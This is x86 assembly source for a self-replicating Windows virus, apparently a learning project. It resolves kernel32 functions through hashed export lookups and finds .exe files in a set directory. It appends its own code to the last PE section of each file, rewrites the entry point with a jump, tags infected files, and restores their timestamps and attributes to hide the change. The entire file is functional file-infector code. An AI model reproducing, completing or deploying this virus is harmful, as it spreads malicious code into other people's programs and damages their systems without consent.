%include "io.inc"
%include "./common.inc"

virusLen equ                  endOfVirus - startOfVirus

global _main

struc DATA
    .EIP:                     resd 1

    ; kernel data
    .kernelAddress:           resd 1
    .nFunctions:              resd 1
    .functionsAddr:           resd 1
    .namesAddr:               resd 1
    .ordinalsAddr:            resd 1

    ; API method addresses
    .functionIndex:           resd 1
    .addressStart:
    .CloseHandle:             resd 1
    .CreateFileA:             resd 1
    .CreateFileMappingA:      resd 1
    .FindClose:               resd 1
    .FindFirstFileA:          resd 1
    .FindNextFileA:           resd 1
    .GetFileAttributesA:      resd 1
    .GetFileSize:             resd 1
    .GetFileTime:             resd 1
    .GetLastError:            resd 1
    .GetStdHandle:            resd 1
    .MapViewOfFile:           resd 1
    .SetCurrentDirectoryA:    resd 1
    .SetEndOfFile:            resd 1
    .SetFileAttributesA:      resd 1
    .SetFilePointer:          resd 1
    .SetFileTime:             resd 1
    .UnmapViewOfFile:         resd 1
    .WriteFile:               resd 1

    ; directory listing data
    .findData:                resb FIND_DATA.size

    ; infection data
    .fileAlign:               resd 1
    .memoryToMap:             resd 1
    .infectionFlag:           resd 1
    .fileOffset:              resd 1    ;removable
    .fileAttributes:          resd 1
    .newFileSize:             resd 1
    .fileHandle:              resd 1
    .lastWriteTime:           resq 1
    .lastAccessTime:          resq 1
    .creationTime:            resq 1
    .mapHandle:               resd 1
    .mapAddress:              resd 1
    .PEHeader:                resd 1
    .oldEntryPoint:           resd 1
    .newEntryPoint:           resd 1
    .imageBase:               resd 1
    .oldRawSize:              resd 1
    .newRawSize:              resd 1
    .incRawSize:              resd 1
    .codeHeaderAddress:       resd 1
    .lastHeaderAddress:       resd 1
    .diskEP:                  resd 1
    .virusAddress:            resd 1
    .virusLocation:           resd 1
    .oldVSOfLast:             resd 1

    ; payload data    
    .overlapped:             resb OVERLAPPED.size
    
    .size:
endstruc


%if DEBUG
section .data
     counter                  dd 1
%endif

section .text
_main:
    mov     ebp, esp                            ; for correct debugging
    
startOfVirus:

    call    getEIP                              ; retrieving current location
anchor:

    ; create stack frame for the local variables
    push    ebp                                 ; save old ebp
    sub     esp, DATA.size                      ; allocate local variables
    mov     ebp, esp                            ; set ebp for variable indexing

    mov [ebp + DATA.EIP], eax                   ; save location EIP

    ; Figure out kernel32.dll's location
    mov     edi, [FS : 0x30]                    ; PEB
    mov     edi, [edi + 0x0C]                   ; PEB->Ldr
    mov     edi, [edi + 0x14]                   ; PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov     edi, [edi]                          ; 2nd Entry
    mov     edi, [edi]                          ; 3rd Entry
    mov     edi, [edi + 0x10]                   ; Third entry's base address (Kernel32.dll)
    mov     [ebp + DATA.kernelAddress] , edi

    mov     eax, [edi + 0x3C]                   ; kernelAddress points to the DOS header, read PE RVA at 0x3C
    add     eax, edi                            ; eax has the virtual address of the PE header
    mov     eax, [eax + 0x78]                   ; The export table RVA is at 0x78 from the start of PE header
    add     eax, edi                            ; eax has the virtual address of the export table
    mov     ecx, [eax + 0x14]                   ; The number of functions is at 0x14 in the export table
    mov     [ebp + DATA.nFunctions], ecx
    mov     ecx, [eax + 0x1C]                   ; RVA of array of function RVAs is at 0x1c
    add     ecx, edi                            ; convert to virtual address
    mov     [ebp + DATA.functionsAddr], ecx     ; save
    mov     ecx, [eax + 0x20]                   ; RVA of array of function name RVAs is at 0x20
    add     ecx, edi                            ; convert to virtual address
    mov     [ebp + DATA.namesAddr], ecx         ; save
    mov     ecx, [eax + 0x24]                   ; RVA of array of function ordinals is at 0x24
    add     ecx, edi                            ; convert to virtual address
    mov     [ebp + DATA.ordinalsAddr], ecx      ; save

    mov     ecx, [ebp + DATA.nFunctions]        ; loop counter
    mov     esi, [ebp + DATA.namesAddr]         ; iterate over array of functions names,
                                                ; which are pointers to zero-terminated strings

    mov     [ebp + DATA.functionIndex], dword 0 ; clear the function index

loopOverNames:
    xor     edx, edx                            ; edx will store the place where to put the address of the function
    mov     eax, [esi]                          ; read the pointer to the name string
    add     eax, edi                            ; convert to virtual address
        push    ecx
        xor     ebx, ebx                        ; the hash code will be computed in ebx
        xor     ecx, ecx                        ; the next character
     hashLoop:
        mov     cl, byte [eax]
        cmp     cl, 0
        jz hashDone
        mov     edx, ebx                        ; save old hash
        shl     ebx, 5                          ; multiply by 32
        sub     ebx, edx                        ; subtract a hash, i.e. multiply by 31
        add     ebx, ecx                        ; add the next character
        inc     eax
        jmp     hashLoop
     hashDone:
        pop     ecx


    ; see if this is a function we actually need
    pusha
    mov     edx, [ebp + DATA.functionIndex]                 ; read the current function index
    mov     eax, [ebp + DATA.EIP]                           ; read EIP of virus start
    cmp     ebx, [eax + (hashStart - anchor) + 4 * edx]     ; compare computed hash with current function hash
    jne     discard                                         ; if does not match, move on
                                                            ; we have a match, compute and save the address
    mov     eax, [ebp + DATA.nFunctions]                    ; compute index of function name
    sub     eax, ecx
    shl     eax, 1                                          ; multiply index by 2
    add     eax, [ebp + DATA.ordinalsAddr]                  ; compute address of ordinal
    xor     ebx, ebx
    mov     bx, word [eax]                                  ; read ordinal
    shl     ebx, 2                                          ; prepare to read function address, multiply ordinal by 4
    add     ebx, [ebp + DATA.functionsAddr]                 ; compute address of function address
    mov     ebx, [ebx]                                      ; read function RVA
    add     ebx, edi                                        ; convert to virtual address
    mov     [ebp + DATA.addressStart + 4 * edx], ebx        ; save the address
    inc     dword [ebp + DATA.functionIndex]                ; increment the function index
    popa

discard:
    add     esi, 4
    dec     ecx
    jnz     loopOverNames


        NOPS


    ; Now we begin with the business of infecting some files

    ; SetCurrentDirectory                   ; TODO FIXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    mov     ebx, [ebp + DATA.EIP]
    add     ebx, directory - anchor
    push    ebx
    call    [ebp + DATA.SetCurrentDirectoryA]


    ; find first file
    lea     ebx, [ebp + DATA.findData]
    push    ebx                             ; Push the address of the search record
    mov     ebx, [ebp + DATA.EIP]           ; Compute pointer to file mask
    add     ebx, exestr - anchor
    push    ebx                             ; Push the address of file mask
    call    [ebp + DATA.FindFirstFileA]
    cmp     eax, -1
    jz      doneInfecting
    mov     edi, eax                                            ; edi will store the file handle
    mov     esi, [ebp + DATA.findData + FIND_DATA.cFileName]    ; read pointer to file name
    mov     ecx, [ebp + DATA.findData + FIND_DATA.nFileSizeLow] ; read file size (lower 4 bytes)
    call    InfectFile
again:
    lea     ebx, [ebp + DATA.findData]
    push    ebx                             ; Push the address of the search record
    mov     ecx, edi
    push    ecx                             ; Push the file handle
    call    [ebp + DATA.FindNextFileA]
    cmp     eax, 0
    jz      doneInfecting
    PRINT_FILE [ebp + DATA.findData + FIND_DATA.cFileName]
    mov     esi, [ebp + DATA.findData + FIND_DATA.cFileName]
    mov     ecx, [ebp + DATA.findData + FIND_DATA.nFileSizeLow]
    call    InfectFile
    PRINT_TRACE
    jmp     again


doneInfecting:
    push     edi
    call    [ebp + DATA.FindClose]

    ; hStdOut = GetstdHandle(STD_OUTPUT_HANDLE)
    push    -11
    call    [ebp + DATA.GetStdHandle]
    mov     edx, eax                        ; copy the stdout handle in ebx

    ; WriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, lpOverlapped);
    xor     eax, eax                                              ; 0x00000000
    not     eax                                                   ; 0xFFFFFFFF
    mov     [ebp + DATA.overlapped + OVERLAPPED.offset], eax      ; set offset to 0xFFFFFFFF
    mov     [ebp + DATA.overlapped + OVERLAPPED.offsetHigh], eax  ; set offsetHigh to 0xFFFFFFFF
    lea     eax, [ebp + DATA.overlapped]
    push    eax                             ; lpOverlapped
    push    NULL                            ; &lpNumberOfBytesWritten
    push    message_end - message           ; nNumberOfBytesToWrite
    mov     eax, [ebp + DATA.EIP]
    add     eax, message - anchor
    push    eax                             ; lpBuffer
    push    edx                             ; stdout handle
    call    [ebp + DATA.WriteFile]

    add     esp, DATA.size                  ; de-allocate local variables
    pop     ebp                             ; restore stack

    jmp     endOfVirus                      ; Get the fuck out



;; HELPER FUNCTIONS

;;  Input:  edx - buffer pointer, ecx - buffer length
;;  Output: eax - the checksum
PECheckSum:
    push    ecx         ; save the length for later
    shr     ecx, 1      ; we're summing WORDs, not bytes 
    xor     eax, eax    ; EAX holds the checksum     
    clc                 ; Clear the carry flag ready for later... 
    
    theLoop: 
    adc	ax, [edx + (ecx * 2) - 2] 
    dec	ecx 
    jnz	theLoop 
    
    pop     ecx
    adc     eax, ecx
    ret 


;; Infects a file
;;    - esi = filename
;;    - ecx = filesize
InfectFile:
    pushad                                          ; Save all registers

    PRINTD "originalFileSize", ecx
    mov     [ebp + DATA.newFileSize], ecx           ; Save file size, old size at this point
    xor     ebx, ebx
    mov     [ebp + DATA.infectionFlag], ebx         ; Reset the infection flag
    add     ecx, virusLen                           ; ECX = victim filesize + virus
    add     ecx, 1000h                              ; ECX = victim filesize + virus + 1000h
    mov     [ebp + DATA.memoryToMap], ecx           ; Memory to map
    PRINT_TRACE ;1

    ;; save the original attributes

    mov     [ebp + DATA.fileOffset], esi            ; ESI = pointer to filename ***
    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
    push    ebx                                     ; Address to filename
    call    [ebp + DATA.GetFileAttributesA]         ; Get the file attributes
    cmp     eax, 0
    mov     [ebp + DATA.fileAttributes], eax

    ;; set the nomral attributes to the file

    push    80h                                     ; 80h = FILE_ATTRIBUTE_NORMAL
    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
    push    ebx                                     ; Address to filename
    call    [ebp + DATA.SetFileAttributesA]         ; Get the file attributes

    ;; open the file

    push    0                                       ; File template
    push    0                                       ; File attributes
    push    3                                       ; Open existing file
    push    0                                       ; Security option = default
    push    1                                       ; File share for read
    mov     ebx, WRITABLE
    or      ebx, READABLE
    push    ebx                                     ; General write and read
    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
    push    ebx                                     ; Address to filename
    call    [ebp + DATA.CreateFileA]                ; create the file
                                                    ; EAX = file handle

    mov     [ebp + DATA.fileHandle], eax            ; Save file handle
    cmp     eax, -1                                 ; error ?
    je      InfectionError                          ; cant open the file ?

    ;; save File creation time, Last write time, Last access time

    lea     ebx, [ebp + DATA.lastWriteTime]
    push    ebx
    lea     ebx, [ebp + DATA.lastAccessTime]
    push    ebx
    lea     ebx, [ebp + DATA.creationTime]
    push    ebx
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.GetFileTime]                ; save time fields FIXME

    ;; create file mapping for the file

    push    0                                       ; Filename handle = NULL
    mov     ebx, [ebp + DATA.memoryToMap]           ; Max size
    push    ebx
    push    0                                       ; Min size (no need)
    push    4                                       ; Page read and write
    push    0                                       ; Security attributes
    mov     ebx, [ebp + DATA.fileHandle]            ; File handle
    push    ebx
    call    [ebp + DATA.CreateFileMappingA]         ; map file to memory
                                                    ; EAX = new map handle

    mov     [ebp + DATA.mapHandle], eax             ; Save map handle
    cmp     eax, 0                                  ; Error ?
    je      CloseFile                               ; Cant map file ?

    ;; map the view of that file

    PRINTD "memoryToMap", [ebp + DATA.memoryToMap]
    mov     ebx, [ebp + DATA.memoryToMap]           ; # Bytes to map
    push    ebx
    push    0                                       ; File offset low
    push    0                                       ; File offset high
    push    2                                       ; File Map Write Mode
    mov     ebx, [ebp + DATA.mapHandle]             ; File Map Handle
    push    ebx
    call    [ebp + DATA.MapViewOfFile]              ; map file to memory

    cmp     eax, 0                                  ; Error ?
    je      CloseMap                                ; Cant map view of file ?
    mov     esi, eax                                ; ESI = base of file mapping
    mov     [ebp + DATA.mapAddress], esi            ; Save base of file mapping

    ;; check whether the mapped file is a PE file and see if its already been infected

    cmp     word [esi + DOS.signature], ZM          ; 'ZM' Is it an EXE file ? (ie Does it have 'MZ' at the beginning?)
    jne     UnmapView                               ; Error ?
    cmp     word [esi + AD_OFFSET], AD              ; 'AD'  ; Already infected ?
    jne     OkGo                                    ; Is it a PE EXE file ?
    mov     word [ebp + DATA.infectionFlag], AD     ; Mark it
    jmp     UnmapView                               ; Error ?

OkGo:
    mov     ebx, [esi + DOS.lfanew]                 ; EBX = PE Header RVA
    cmp     word [esi + ebx], EP                    ; 'EP'  ; Is it a PE file ?
    jne     UnmapView                               ; Error ?
    PRINT_TRACE ;2

    ;; If the file is not EXE, is already infected or is not a PE file, we proceed to
    ;; unmap the view of file, otherwise parse the PE Header.

    add     esi, ebx                                ; (ESI points to PE header now)
    mov     [ebp + DATA.PEHeader], esi              ; Save PE header
    mov     eax, [esi + PE.Machine]                 ; read machine field in PE Header
    cmp     ax, INTEL386                            ; 0x014c = Intel 386
    jnz     UnmapView                               ; if not 32 bit, then error and quit
    mov     eax, [esi + PE.AddressOfEntryPoint]     
    mov     [ebp + DATA.oldEntryPoint], eax         ; Save Entry Point of file
    mov     eax, [esi + PE.ImageBase]               ; Find the Image Base
    mov     [ebp + DATA.imageBase], eax             ; Save the Image Base
    mov     eax, [esi + PE.FileAlignment]
    mov     dword [ebp + DATA.fileAlign], eax       ; Save File Alignment ; (EAX = File Alignment)
    PRINT_TRACE ;3
    
    mov     ebx, [esi + PE.NumberOfRvaAndSizes]     ; Number of directories entries, PE + 0x74
    shl     ebx, 3                                  ; * 8 (size of data directories)
    add     ebx, PE.size                            ; add size of PE header
    add     ebx, [ebp + DATA.PEHeader]              ; EBX = address of the .text section
    mov     [ebp + DATA.codeHeaderAddress], ebx     ; save codeHeaderAddress
    PRINT_TRACE ;4


    ;; Locate the last section in the PE

    push    esi

    mov     ebx, [esi + PE.NumberOfRvaAndSizes]     ; Number of directories entries
    shl     ebx, 3                                  ; * 8 (size)
    xor     eax, eax
    mov     ax, word [esi + PE.NumberOfSections]    ; AX = number of sections
    dec     eax                                     ; Look for the last section ending
    mov     ecx, SECTIONH.size                      ; ECX = size of sections header
    mul     ecx                                     ; EAX = ECX * EAX
    add     esi, PE.size
    add     esi, ebx
    add     esi, eax                                ; ESI = Pointer to the last section header
    mov     [ebp + DATA.lastHeaderAddress], esi

    PRINT_TRACE ;5

    mov     ebx, [ebp + DATA.codeHeaderAddress]     ; EBX points to the code header
    mov     eax, [ebx + SECTIONH.PointerToRawData]  ; pointer to raw data of code segment
    add     eax, [ebx + SECTIONH.VirtualSize]       ; virtual size of code segment
    mov     [ebp + DATA.diskEP], eax                ; where exectuable code is (entryPoint will jump here)

    PRINT_TRACE ;6

    mov     eax, [ebp + DATA.imageBase]             ; ESI = Pointer to the last section header
    add     eax, [esi + SECTIONH.VirtualAddress]    ; VirtualAddress
    add     eax, [esi + SECTIONH.VirtualSize]       ; VirtualSize
    mov     [ebp + DATA.virusAddress], eax

    PRINT_TRACE ;7
                                                    ; ESI = Pointer to the last section header
    mov     eax, [esi + SECTIONH.PointerToRawData]  ; reading PointerToRawData
    add     eax, [esi + SECTIONH.VirtualSize]       ; reading VirtualSize
    mov     [ebp + DATA.virusLocation], eax

    PRINT_TRACE ;8

    pop   ebx                                       ; restore old PE header into ebx

    or      dword [esi + SECTIONH.Characteristics], CODE            ; Set [CWE] flags (CODE)
    or      dword [esi + SECTIONH.Characteristics], EXECUTABLE      ; Set [CWE] flags (EXECUTABLE)
    or      dword [esi + SECTIONH.Characteristics], WRITABLE        ; Set [CWE] flags (WRITABLE)

    ;; The flags tell the loader that the section now
    ;; has executable code and is writable

    mov     eax, [esi + SECTIONH.SizeOfRawData]    ; EAX = size of raw data in this section (ESI = Pointer to the last section header)
    mov     [ebp + DATA.oldRawSize], eax           ; Save it
    mov     ecx, [esi + SECTIONH.VirtualSize]
    mov     [ebp + DATA.oldVSOfLast], ecx
    add     dword [esi + SECTIONH.VirtualSize], virusLen    ; Increase virtual size
    PRINTD "oldRawSize", [ebp + DATA.oldRawSize]

    ;; Update ImageBase

    mov     eax, [esi + SECTIONH.VirtualSize]               ; Get new size in EAX
    add     eax, [esi + SECTIONH.VirtualAddress]            ; + section rva
    mov     [ebx + PE.SizeOfImage], eax                     ; Save SizeOfImage

    ;; The size of raw data is the actual size of the
    ;; data in the section, The virtual size is the one
    ;; we must increase with our virus size, Now after
    ;; the increasing, lets check how much did we mess
    ;; the file align, To do that we divide the new size
    ;; to the filealign value and we get as a reminder
    ;; the number of bytes to pad

    mov     eax, [esi + SECTIONH.VirtualSize]               ; Get new size in EAX
    mov     ecx, [ebp + DATA.fileAlign]                     ; ECX = File alignment
    div     ecx                                             ; Get remainder in EDX
    mov     ecx, [ebp + DATA.fileAlign]                     ; ECX = File alignment
    sub     ecx, edx                                        ; Number of bytes to pad
    mov     [esi + SECTIONH.SizeOfRawData], ecx             ; Save it
    PRINT_TRACE ;9

    ;; Now size of raw data = number of bytes to pad

    mov     eax, [esi + SECTIONH.VirtualSize]               ; Get current VirtualSize
    add     eax, [esi + SECTIONH.SizeOfRawData]             ; EAX = SizeOfRawdata padded
    mov     [esi + SECTIONH.SizeOfRawData], eax             ; Set new SizeOfRawdata

    ;; Now size of raw data = old virtual size + number of bytes to pad

    mov     [ebp + DATA.newRawSize], eax                    ; Save it
    PRINTD "newRawSize", [ebp + DATA.newRawSize]

    ;; The virus will be at the end of the section, In
    ;; order to find its address we have the following formula:
    ;; VirtualAddress + VirtualSize - VirusLength + RawSize = VirusStart

    mov     eax, [ebp + DATA.codeHeaderAddress]
    mov     ebx, [ebp + DATA.codeHeaderAddress]
    mov     eax, [ebx + SECTIONH.VirtualAddress]            ; Reading code segment's RVA
    add     eax, [ebx + SECTIONH.VirtualSize]               ; Add the size of the segment
    PRINT_TRACE;11
    mov     [ebp + DATA.newEntryPoint], eax                 ; EAX = new EIP, and save it
    PRINT_TRACE;12

    ;; Here we compute with how much did we increase the size of raw data

    mov     eax, [ebp + DATA.oldRawSize]                ; Original SizeOfRawdata
    mov     ebx, [ebp + DATA.newRawSize]                ; New SizeOfRawdata
    sub     ebx, eax                                    ; Increase in size
    mov     [ebp + DATA.incRawSize], ebx                ; Save increase value
    PRINT_TRACE ;13

    ;; Compute the new file size                         

    mov     eax, [esi + SECTIONH.PointerToRawData]      ; Read PointerToRawData from last section's header
    PRINTD "PointerToRawData", eax
    add     eax, [ebp + DATA.newRawSize]                ; Add size of new raw data
    mov     [ebp + DATA.newFileSize], eax               ; EAX = new filesize, and save it
    PRINTD "newFileSize", [ebp + DATA.newFileSize]

    ;; Now prepare to copy the virus to the host, The formulas are                                      ;;

    mov     eax, [ebp + DATA.diskEP]                    ; Align in memory to map address
    add     eax, [ebp + DATA.mapAddress]

    mov     [eax], byte JMP_NR                          ; relative near jump instruction
    mov     ebx, [ebp + DATA.lastHeaderAddress]
    mov     ebx, [ebx + SECTIONH.VirtualAddress]        ; lastSegment address
    PRINTH "lastSegment address", ebx
    mov     ecx, [ebp + DATA.codeHeaderAddress]
    sub     ebx, [ecx + SECTIONH.VirtualAddress]        ; - codeSegment address
    PRINTH "codeSegment address", [ecx]
    add     ebx, [ebp + DATA.oldVSOfLast]               ; + lastSegment size
    PRINTH "lastSegment size", [ecx]
    mov     ecx, [ebp + DATA.codeHeaderAddress]
    sub     ebx, [ecx + SECTIONH.VirtualSize]           ; - codeSegment size
    PRINTH "codeSegment size", [ecx]
    sub     ebx, JMP_NR_BYTES                           ; subtract length of the jump instruction (it takes up 5 bytes of space)
    mov     [eax + 1], ebx                              ; write the 4 byte address of the JMP
    PRINTH "relative address jump", ebx
    PRINT_TRACE ;14

    mov     edi, [ebp + DATA.virusLocation]    ; Location to copy the virus to
    add     edi, [ebp + DATA.mapAddress]
    mov     eax, [ebp + DATA.EIP]
    lea     esi, [eax - JMP_NR_BYTES]          ; Location to copy the virus from
    mov     ecx, virusLen                      ; Number of bytes to copy
    rep     movsb                              ; Copy all the bytes
    PRINT_TRACE ;15

    mov     eax, virusLen
    PRINTD "virusLen", eax
    add     eax, [ebp + DATA.virusLocation]
    add     eax, [ebp + DATA.mapAddress]

    PRINT_TRACE ;16

    ; Transfer execution to the host entry point
    mov     ecx, [ebp + DATA.codeHeaderAddress]
    add     ebx, [ecx + SECTIONH.VirtualSize]   ; add Size of CodeSegment
    sub     ebx, [ebp + DATA.oldEntryPoint]     ; subtract old entry point
    add     ebx, 0x1000                         ; correct for BaseOfCode
    add     ebx, 2*JMP_NR_BYTES                 ; correct for 2 near JMPs (2 x 5 bytes)
    add     ebx, virusLen                       ; add virusLength
    neg     ebx
    mov     [eax], byte JMP_NR                  ; relative near jump instruction
    mov     [eax + 1], ebx                      ; write the 4 byte address of the JMP
    PRINT_TRACE ;17
    PRINTH "ebx", ebx

    ;; Now, lets alter the PE header by marking the new IP, increasing the total 
    ;; size of the files image with the increasing of the last section

    PRINT_TRACE ;18
    mov     esi, [ebp + DATA.PEHeader]              ; ESI = Address of PE header
    mov     eax, [ebp + DATA.newEntryPoint]         ; Get value of new EIP in EAX
    PRINT_TRACE ;19
    mov     [esi + PE.AddressOfEntryPoint], eax     ; Write it to the PE header

    PRINT_TRACE ;20

    ;; Now, lets mark the file as infected

    mov     esi, [ebp + DATA.mapAddress]
    mov     word [esi + AD_OFFSET], AD              ;'AD'  ; Mark file as infected
    PRINT_TRACE ;16
    
    ; Recompute PE checksum
    ;mov     edx, [ebp + DATA.PEHeader]
    ;mov     eax, [edx + PE.CheckSum]
    ;PRINTH  "checksum", eax
    ;mov     [edx + PE.CheckSum], dword 0            ; clear the old checksum
    ;mov     ecx, PE.size
    ;call    PECheckSum
    ;mov     [edx + PE.CheckSum], eax                ; save the new checksum

UnmapView:
    mov     ebx, [ebp + DATA.mapAddress]
    push    ebx
    call    [ebp + DATA.UnmapViewOfFile]
    PRINT_TRACE

CloseMap:
    mov     ebx, [ebp + DATA.mapHandle]
    push    ebx
    call    [ebp + DATA.CloseHandle]
    PRINT_TRACE

CloseFile:
    lea     ebx, [ebp + DATA.lastWriteTime]
    push    ebx
    lea     ebx, [ebp + DATA.lastAccessTime]
    push    ebx
    lea     ebx, [ebp + DATA.creationTime]
    push    ebx
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.SetFileTime]                ; set time fields FIXME
    PRINT_TRACE

    ;; In order to properly close the file we must set its EOF at the exact end
    ;; of file, So first we move the pointer to the end and set the EOF

    push    0                                       ; First we must set the file
    push    NULL                                    ; Pointer at the end of file (that is the beginning + new file size)
    mov     ebx, [ebp + DATA.newFileSize]
    push    ebx
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.SetFilePointer]
    PRINT_TRACE

    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.SetEndOfFile]
    PRINT_TRACE

    ;; And finaly we close the file

    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.CloseHandle]
    PRINT_TRACE

    ;; Then we must restore file attributes

    mov     ebx, [ebp + DATA.fileAttributes]
    push    ebx
    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
    push    ebx                                     ; Push the address of the search record
    PRINT_TRACE
    call    [ebp + DATA.SetFileAttributesA]
    PRINT_TRACE

    jmp     InfectionSuccessful

InfectionError:
    stc
    jmp     OutOfHere

InfectionSuccessful:
    PRINT_TRACE
    mov     eax, 15
    cmp     word[ebp + DATA.infectionFlag], AD
    je      InfectionError
    clc                                             ; clear CARRY flag

OutOfHere:
  PRINT_TRACE
    popad        ; Restore all registers
  
    retn


    ;; Returns the current value of the EIP register
getEIP:
    mov     eax, [esp]
    retn


    ;; Constant data section

    message:                db 'Good morning America!', 10
    message_end:
    directory:              db "C:\Assembly\Dummies\", 0
    exestr:                 db "*.exe", 0

    hashStart:
     CloseHandle:             dd 0x59e68620
     CreateFileA:             dd 0x44990e89
     CreateFileMappingA:      dd 0xa481360b
     FindClose:               dd 0x8f86c39f
     FindFirstFileA:          dd 0x79e4b02e
     FindNextFileA:           dd 0x853fd939
     GetFileAttributesA:      dd 0xbcd7bc98
     GetFileSize:             dd 0xb36c10f3
     GetFileTime:             dd 0xb36c83bf
     GetLastError:            dd 0x7fca427c ; delete
     GetStdHandle:            dd 0xe0557795 ; delete
     MapViewOfFile:           dd 0xcbee3954
     SetCurrentDirectoryA:    dd 0x80414dab
     SetEndOfFile:            dd 0xbdca5e8c
     SetFileAttributesA:      dd 0xf3ae560c
     SetFilePointer:          dd 0x8dce837f
     SetFileTime:             dd 0xae24e4cb
     UnmapViewOfFile:         dd 0x7f75f35b
     WriteFile:               dd 0x2398d9db ; delete


    NOPS


endOfVirus:

    push    0
    call    _ExitProcess@4
